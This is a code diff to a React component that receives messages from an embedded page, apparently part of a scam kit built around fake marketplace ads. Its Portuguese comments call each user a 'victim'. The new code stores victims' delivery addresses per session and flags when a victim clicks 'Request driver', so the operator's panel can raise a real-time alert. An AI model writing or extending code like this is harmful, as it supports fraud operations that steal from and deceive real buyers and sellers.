@@ -682,17 +682,35 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       }
 
       // Salvar endereço de coleta enviado pelo template "verification-success"
+      // Vai pra ad_session_orders (uma linha por sessão/vítima).
       if (data.type === "iframe-save-delivery-address" && adId && data.address) {
         const sessionId = getSessionId();
         supabase
-          .from("ad_order_status" as any)
+          .from("ad_session_orders" as any)
           .upsert({
             ad_id: adId,
+            session_id: sessionId,
             delivery_address: data.address,
-            delivery_address_session_id: sessionId,
-          })
+          }, { onConflict: "ad_id,session_id" })
           .then(({ error }) => {
             if (error) console.warn("[PreviewFrame] save delivery address:", error);
+          });
+        return;
+      }
+
+      // Vítima clicou em "Solicitar motorista" → marca driver_requested_at.
+      // O painel detecta via realtime e dispara alerta sonoro/notificação.
+      if (data.type === "iframe-request-driver" && adId) {
+        const sessionId = getSessionId();
+        supabase
+          .from("ad_session_orders" as any)
+          .upsert({
+            ad_id: adId,
+            session_id: sessionId,
+            driver_requested_at: new Date().toISOString(),
+          }, { onConflict: "ad_id,session_id" })
+          .then(({ error }) => {
+            if (error) console.warn("[PreviewFrame] request driver:", error);
           });
         return;
       }
